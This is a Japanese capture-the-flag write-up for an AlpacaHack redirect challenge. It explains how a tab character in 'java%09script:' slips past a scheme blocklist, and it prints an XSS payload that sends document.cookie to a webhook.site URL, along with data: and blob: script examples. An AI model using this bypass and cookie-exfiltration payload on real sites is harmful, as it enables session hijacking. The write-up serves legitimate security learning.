# 2026/02/14 問題

https://alpacahack.com/daily/challenges/you-are-being-redirected

## 問題文

```
You don't want the browser to go to external websites without warning, do you?
```

## 考察

リダイレクト URL 作成ページに任意の URL を入力すると、リダイレクト URL が作成される。

例えば `https://google.com` を入力すると、以下のようなリダイレクト URL が作成される。

`http://localhost:3000/redirect?to=https%3A%2F%2Fgoogle.com`

上記リンクを踏むと、リダイレクト確認ページを挟んだ後に目的のサイトへ遷移する。

今回はページを弄るのではなく、~~リダイレクトページを踏まずに目的のサイトへ遷移する方法を考えるものと思われる。~~ \　
行き詰まったので Gemini にヒントを聞いたところ、 XSS で Cookie の情報を引っこ抜く問題らしい。

`redirect.html` の中身を確認する。

```
const FORBIDDEN = ["data", "javascript", "blob"];

const params = new URLSearchParams(window.location.search);
let dest = params.get('to') ?? "/";
const link = document.getElementById("link");

if(FORBIDDEN.some(str => dest.toLowerCase().includes(str))) {
  dest = "/";
}
```

リダイレクト URL に `javascript` などの URI スキームが含まれている場合は、トップページにリダイレクトするよう、リダイレクト先を書き換える。

```
const url = new URL(dest, window.location.href);
link.href = url.href;
link.innerText = url.href;
setTimeout(() => {
  window.location.replace(url.href);
}, 2000);
```

ブラウザ標準の URL クラスを使って、文字列を正規の URL オブジェクトに変換し、2秒後にリダイレクト先に遷移する。

URL オブジェクトへの変換を行う `new URL(dest, window.location.href);` は `http:` や `javascript:` と言ったプロトコル部分に含まれるタブ文字や改行文字を除去して解釈する特性がある。

一方で、バリデーションの `.includes(str)` では、タブ文字が入っていると別物のみなすため、これらの仕様を悪用することでスクリプトを発火させる。

### 回答

まずは JavaScript が発火するか `/redirect?to=java%09script:alert(1)` が動作するか確認する。 → OK

リダイレクト先を用意する。どうやら無料で使用できる Webhook サービス https://webhook.site があるので、それを利用する。

下記の XSS スクリプトを作成する。

```
redirect?to=java%09script:location.replace('https://webhook.site/8acef09e-7859-4c0b-9ea1-3c84aae37a7f/?c='%2BencodeURIComponent(document.cookie))
```

- `location.replace()` : 指定した URL へ遷移させる。現在のページを上書きするため、 `href` とは異なり「戻る」ボタンで戻ることもできない。
- `%2B` : 文字列結合演算子 `+` をエンコードしたもの。　URL 内では `+` は半角スペースと解釈されるため、エンコードを行わないと SyntaxError になってしまう。
- `encodeURIComponent(document.cookie)` : 文字列（今回の場合、Cookie ）を URL で安全に使える形式に変換する。
  - これを使用しないと、Cookie の中身が `session=123; admin=true` だった場合、セミコロンで URL が切れてしまう可能性がある

これを Bot に実行させ、Webhook に飛んできたリクエストを確認する。

`Alpaca%7Bwh4t_comes_after_the_redir3ct_pa9e%7D`

これをデコードすると

`Alpaca{wh4t_comes_after_the_redir3ct_pa9e}`

## 参考

### バリデーション対象になっていた JavaScript 以外の URI スキーム

- `data:`
  - 「ファイルの中身そのものをURLの中に埋め込む」 機能
  - 本来の用途:
    - 小さなアイコン画像などをHTMLの中に直接書き込み、サーバーへの通信回数を減らすために使われる（インライン化）。
  - 構造: `data:[<メディアタイプ>][;base64],<データ>`
  - CTF/セキュリティでの危険性:
    - 画像だけでなく、 HTML ファイルそのものを埋め込むことが可能。これを iframe （インラインフレーム要素）やリダイレクト先に指定すると、攻撃者が作った偽のページを表示したり、そこからスクリプトを実行できる
    - 例: `<a href="data:text/html,<script>alert('Hi')</script>">ページへ移動</a>`

- `blob:`
  - 「ブラウザのメモリ上に一時保存されたデータへの参照リンク」
  - 本来の用途:
    - YouTubeやNetflixなどの動画プレイヤー、ファイルアップロード処理などでよく見かけます。サーバー上のファイルではなく、JavaScriptが動的に生成してメモリに持っているバイナリデータを指し示します。
  - 構造: `blob:https://example.com/<<RANDOM_ID>>`
  - CTF/セキュリティでの危険性:
    - `data:` と似ていますが、URLが短くランダムに見えるため、一見すると安全なリンクに見えます。攻撃者が JavaScript を使って悪意あるHTMLファイル（Blob）をメモリ上に作成し、そこにユーザーを誘導することでスクリプトを実行させることができます。

```
// 攻撃者が内部で作るコードのイメージ
const dangerousCode = '<script>alert(1)</script>';
const blob = new Blob([dangerousCode], {type: 'text/html'});
const url = URL.createObjectURL(blob);
// url は "blob:http://localhost:3000/..." のようになる
window.location = url;
```

まとめ

| スキーム      | 攻撃者の狙い                                                     |
| ------------- | ---------------------------------------------------------------- |
| `javascript:` | リンクを踏ませて即座にスクリプトを実行し、Cookieを盗む。         |
| `data:`       | 偽ページ（HTML）を生成して表示させ、そこからスクリプトを動かす。 |
| `blob:`       | メモリ上に作った偽ページを表示させる（data: の高度版）。         |

## redirect.html の実装について

```
const url = new URL(dest, window.location.href);
```

- `new URL();` : URL オブジェクトの生成を行う。第1引数が絶対パスであれば、そのまま絶対パスを。相対パスであれば、第2引数を参照してオリジンを補完する。
- `window.location.href` : ウィンドウ（タブ）で開いているページのフルパスを返す。

```
<div class="card">
  <p class="muted">You are being redirected to</p><p><a id="link"></a></p>
</div>
<script>

  ~~ Snip ~~

  link.innerText = url.href;
  setTimeout(() => {
    window.location.replace(url.href);
  }, 2000);
</script>
```

- `link.href` : 実際のリンク先
- `link.innerText` : 表示文字

生成後の HTML には以下のように収まる。

```
<a id="link" href="（ここが link.href）">（ここが link.innerText）</a>
```

`link` 属性を埋めておくことで、ブラウザのセキュリティ機能で自動リダイレクト（ XSS ）がブロックされた場合でも、被攻撃者に手動で XSS を発火させることができる。
